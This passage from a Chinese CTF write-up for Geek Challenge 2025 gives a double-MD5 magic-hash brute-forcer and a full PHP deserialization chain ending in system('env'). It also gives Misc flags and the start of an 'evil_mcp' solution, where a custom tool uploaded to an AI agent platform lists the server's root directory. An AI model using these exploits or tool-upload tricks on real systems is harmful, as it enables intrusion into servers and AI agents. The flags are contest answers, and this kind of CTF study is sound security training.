class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ProcessPoolExecutor, as_completed</span><br><span class="line"></span><br><span class="line">MAGIC_RE = re.<span class="built_in">compile</span>(<span class="string">r&quot;^0e\d&#123;30&#125;$&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hex</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(data).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_magic</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="comment"># PHP 7.3 “数值型字符串”判定需要完全像 0e123... 这种</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(MAGIC_RE.<span class="keyword">match</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_candidate</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="comment"># 我们要 md5(md5(s)) 命中 0e\d&#123;30&#125;</span></span><br><span class="line">    h1 = md5_hex(s.encode())</span><br><span class="line">    h2 = md5_hex(h1.encode())</span><br><span class="line">    <span class="keyword">return</span> is_magic(h2), h1, h2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker_numeric</span>(<span class="params">start: <span class="built_in">int</span>, step: <span class="built_in">int</span>, report_every: <span class="built_in">int</span> = <span class="number">100000</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    纯数字递增搜索：进程 i 负责从 start+i 开始，每次加 step</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    i = start</span><br><span class="line">    tried = <span class="number">0</span></span><br><span class="line">    t0 = time.time()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ok, h1, h2 = test_candidate(<span class="built_in">str</span>(i))</span><br><span class="line">        tried += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ok:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>, <span class="built_in">str</span>(i), h1, h2, tried, time.time() - t0</span><br><span class="line">        <span class="keyword">if</span> tried % report_every == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 便于观察进度（可按需注释掉）</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        i += step</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_ascii</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    alphabet = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker_random</span>(<span class="params">seed: <span class="built_in">int</span>, report_every: <span class="built_in">int</span> = <span class="number">200000</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    随机搜索：固定随机种子，生成 8~24 长度的字母数字串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    random.seed(seed ^ <span class="built_in">int</span>.from_bytes(os.urandom(<span class="number">8</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line">    tried = <span class="number">0</span></span><br><span class="line">    t0 = time.time()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = rand_ascii(random.randint(<span class="number">8</span>, <span class="number">24</span>))</span><br><span class="line">        ok, h1, h2 = test_candidate(s)</span><br><span class="line">        tried += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ok:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>, s, h1, h2, tried, time.time() - t0</span><br><span class="line">        <span class="keyword">if</span> tried % report_every == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 可按需打印进度</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Find s.t. md5(md5(s)) matches ^0e\\d&#123;30&#125;$&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--workers&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=os.cpu_count() <span class="keyword">or</span> <span class="number">4</span>, <span class="built_in">help</span>=<span class="string">&quot;并行进程数&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--start&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">0</span>, <span class="built_in">help</span>=<span class="string">&quot;数字模式的起始值&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--random&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;使用随机字符串搜索（默认：数字递增）&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] workers=<span class="subst">&#123;args.workers&#125;</span> mode=<span class="subst">&#123;<span class="string">&#x27;random&#x27;</span> <span class="keyword">if</span> args.random <span class="keyword">else</span> <span class="string">&#x27;numeric&#x27;</span>&#125;</span>&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> ProcessPoolExecutor(max_workers=args.workers) <span class="keyword">as</span> ex:</span><br><span class="line">        futures = []</span><br><span class="line">        <span class="keyword">if</span> args.random:</span><br><span class="line">            <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(args.workers):</span><br><span class="line">                futures.append(ex.submit(worker_random, seed=(args.start + w)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 数字递增：进程 w 负责从 start+w 开始，每次 +workers</span></span><br><span class="line">            <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(args.workers):</span><br><span class="line">                futures.append(ex.submit(worker_numeric, args.start + w, args.workers))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> fut <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">            ok, s, h1, h2, tried, elapsed = fut.result()</span><br><span class="line">            <span class="keyword">if</span> ok:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[!] FOUND CANDIDATE!&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    s         = <span class="subst">&#123;s!r&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    md5(s)    = <span class="subst">&#123;h1&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    md5(md5)  = <span class="subst">&#123;h2&#125;</span>   (matches ^0e\\d&#123;&#123;30&#125;&#125;$)&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    tried     = <span class="subst">&#123;tried&#125;</span> in <span class="subst">&#123;elapsed:<span class="number">.2</span>f&#125;</span>s (this worker)&quot;</span>)</span><br><span class="line">                <span class="comment"># 取消其他进程</span></span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> futures:</span><br><span class="line">                    f.cancel()</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br><span class="line"></span><br><span class="line"><span class="comment"># python find_double_md5_magic.py --workers 8 --start 0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[!] FOUND CANDIDATE!</span><br><span class="line">    s         = &#x27;179122048&#x27;</span><br><span class="line">    md5(s)    = 30c14e38d72a2203bc0bdd2ced6484e6</span><br><span class="line">    md5(md5)  = 0e983430692806892134340492059275   (matches ^0e\d&#123;30&#125;$)</span><br><span class="line">    tried     = 22390257 in 197.42s (this worker)</span><br></pre></td></tr></table></figure>

<p>于是第一层可以这样子解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$payload = new All_in_one();</span><br><span class="line">$payload -&gt; KiraKiraAyu = &quot;179122048&quot;; //两次md5后为0e983430692806892134340492059275</span><br><span class="line">$payload -&gt; K4per = &quot;s1885207154a&quot;; //s1836677006a也可以</span><br></pre></td></tr></table></figure>

<p>在__set里要满足</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$fox = $this-&gt;Fox;</span><br><span class="line">if ( !($fox instanceof All_in_one) &amp;&amp; $fox()===&quot;summer&quot;)</span><br></pre></td></tr></table></figure>

<p>可以将Fox设为可调用的字符串”summer::find_myself”，$fox()调用返回”summer”</p>
<p>之后走到__call后需要满足的条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strlen($args[0])&lt;4 &amp;&amp; ($args[0]+1)&gt;10000</span><br></pre></td></tr></table></figure>

<p>很简单，9e9即可</p>
<p>后面很常规的走完链子就行</p>
<p>完整exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">All_in_one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KiraKiraAyu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_4ak5ra</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$K4per</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Sams</span>āra;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$komiko</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Fox</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Eureka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QYQS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sleep3r</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ivory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他还是没有忘记那个&quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;收集夏日的碎片吧&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fox</span> = <span class="variable language_">$this</span>-&gt;Fox;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$fox</span>();</span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="variable">$fox</span> <span class="keyword">instanceof</span> All_in_one) &amp;&amp; <span class="variable">$fox</span>()===<span class="string">&quot;summer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;QYQS enjoy summer&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$komiko</span> = <span class="variable language_">$this</span>-&gt;komiko;</span><br><span class="line">            <span class="variable">$komiko</span>-&gt;<span class="title function_ invoke__">Eureka</span>(<span class="variable">$this</span>-&gt;L, <span class="variable">$this</span>-&gt;sleep3r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;恭喜成功signin!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome to Geek_Challenge2025!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;Samsāra;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="variable language_">$this</span>-&gt;ivory;</span><br><span class="line">        <span class="variable">$f</span>(<span class="variable">$arg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你能让K4per和KiraKiraAyu组成一队吗&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;K4per)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))===<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;boys和而不同&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu)) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per));</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))==<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOY♂ sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;QYQS-&gt;partner = <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOY♂ can`t sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu)).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;boys堂堂正正&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再走一步...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;_4ak5ra;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$args</span>[<span class="number">0</span>])&lt;<span class="number">4</span> &amp;&amp; (<span class="variable">$args</span>[<span class="number">0</span>]+<span class="number">1</span>)&gt;<span class="number">10000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;再走一步&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$args</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你要努力进窄门&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">find_myself</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$payload</span> -&gt; KiraKiraAyu = <span class="string">&quot;179122048&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> -&gt; K4per = <span class="string">&quot;s1885207154a&quot;</span>;  <span class="comment">//s1836677006a</span></span><br><span class="line"><span class="variable">$payload</span> -&gt; QYQS = <span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$payload</span> -&gt; QYQS -&gt; Fox = <span class="string">&quot;summer::find_myself&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> -&gt; QYQS -&gt; komiko = <span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$payload</span> -&gt; QYQS -&gt; L = <span class="string">&quot;9e9&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> -&gt; QYQS -&gt; sleep3r = <span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$payload</span> -&gt; QYQS -&gt; sleep3r -&gt; _4ak5ra = <span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$payload</span> -&gt; QYQS -&gt; sleep3r -&gt; _4ak5ra -&gt; Samsāra = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> -&gt; QYQS -&gt; sleep3r -&gt; _4ak5ra -&gt; ivory = <span class="string">&quot;env&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>追踪tcp流，解base64<br>SYC{R_U_A_F0R3NS1C5_MASTER?}</p>
<h3 id="🗃️🗃️"><a href="#🗃️🗃️" class="headerlink" title="🗃️🗃️"></a>🗃️🗃️</h3><p>exif信息泄露<br>SYC{北京市_天坛公园}</p>
<h3 id="evil-mcp"><a href="#evil-mcp" class="headerlink" title="evil_mcp"></a>evil_mcp</h3><p>还挺新的题型，做法倒是很简单<br>可以自己实现一个工具（实际就是一个python脚本）并上传，然后在与AI对话时可以直接调用</p>
<p>给的模板如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 平台会自动注入 ToolResult / ToolExecutionContext / tool</span></span><br><span class="line"><span class="meta">@tool(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    name=<span class="string">&quot;echo_agent&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    description=<span class="string">&quot;示例：返回用户输入，并展示会话与调用信息&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    input_schema=&#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;properties&quot;</span>: &#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">            <span class="string">&quot;text&quot;</span>: &#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">                <span class="string">&quot;description&quot;</span>: <span class="string">&quot;需要原样返回的文本&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="meta">            &#125;</span></span></span><br><span class="line"><span class="params"><span class="meta">        &#125;,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;required&quot;</span>: [<span class="string">&quot;text&quot;</span>]</span></span></span><br><span class="line"><span class="params"><span class="meta">    &#125;</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">echo_agent</span>(<span class="params">arguments: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>], context: ToolExecutionContext</span>) -&gt; ToolResult:</span><br><span class="line">    content = (</span><br><span class="line">        <span class="string">f&quot;Echo: <span class="subst">&#123;arguments[<span class="string">&#x27;text&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">        <span class="string">f&quot;session_id=<span class="subst">&#123;context.session_id&#125;</span>, invocation_id=<span class="subst">&#123;context.invocation_id&#125;</span>&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> ToolResult(content=content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将工具实例暴露给平台</span></span><br><span class="line"><span class="comment"># 如果使用 @tool 装饰器，最终需要赋值给名为 tool 的变量</span></span><br><span class="line"><span class="comment"># tool = echo_agent  # 如果需要显式指定，可以保留这一行</span></span><br></pre></td></tr></table></figure>

<p>ls_root工具</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 平台会自动注入 ToolResult / ToolExecutionContext / tool 装饰器与类型</span></span><br><span class="line"><span class="meta">@tool(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    name=<span class="string">&quot;ls_root&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    description=<span class="string">&quot;列出根目录内容（等价于执行 ls /），不接受参数。&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    input_schema=&#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;properties&quot;</span>: &#123;&#125;,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;additionalProperties&quot;</span>: <span class="literal">False</span></span></span></span><br><span class="line"><span class="params"><span class="meta">    &#125;</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">ls_root</span>(<span class="params">arguments: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>], context: ToolExecutionContext</span>) -&gt; ToolResult:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        